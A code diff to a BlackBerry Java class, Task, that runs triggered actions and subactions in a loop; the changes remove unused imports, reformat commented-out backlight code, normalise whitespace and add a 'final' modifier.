@@ -12,11 +12,9 @@ package blackberry;
 import java.util.Timer;
 import java.util.Vector;
 
-import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.DeviceInfo;
 import blackberry.action.Action;
 import blackberry.action.SubAction;
-import blackberry.interfaces.BatteryStatusObserver;
 import blackberry.interfaces.Singleton;
 import blackberry.log.LogCollector;
 import blackberry.utils.Check;
@@ -102,13 +100,15 @@ public final class Task implements Singleton {
         Utils.sleep(1000);
 
         for (;;) {
-            
-           /* if(Backlight.isEnabled()){
-                notifyBacklight(true);
-            }else{
-                notifyBacklight(false);
-            }*/
-            
+
+            /*
+             * if(Backlight.isEnabled()){
+             * notifyBacklight(true);
+             * }else{
+             * notifyBacklight(false);
+             * }
+             */
+
             //#ifdef DEBUG_TRACE
             // debug.trace("checkActions");
             //#endif
@@ -147,7 +147,7 @@ public final class Task implements Singleton {
                             Check.asserts(subAction != null,
                                     "checkActions: subAction!=null");
                             //#endift
-                            
+
                             final boolean ret = subAction.execute(action
                                     .getTriggeringEvent());
 
@@ -179,7 +179,7 @@ public final class Task implements Singleton {
                                 status.unTriggerAll();
                                 return true;
                             }
-                        } catch (Exception ex) {
+                        } catch (final Exception ex) {
                             //#ifdef DEBUG_ERROR
                             debug.error("checkActions: " + ex);
                             //#endif
@@ -191,14 +191,15 @@ public final class Task implements Singleton {
         }
     }
 
-/*    private boolean lastBacklight = false;
-    private synchronized void notifyBacklight(boolean backlight) {
-        if(backlight!=lastBacklight){
-            lastBacklight=backlight;
-            
-            AppListener.getInstance().backlightStateChange(backlight);
-        }
-    }*/
+    /*
+     * private boolean lastBacklight = false;
+     * private synchronized void notifyBacklight(boolean backlight) {
+     * if(backlight!=lastBacklight){
+     * lastBacklight=backlight;
+     * AppListener.getInstance().backlightStateChange(backlight);
+     * }
+     * }
+     */
 
     /**
      * Start application timer.
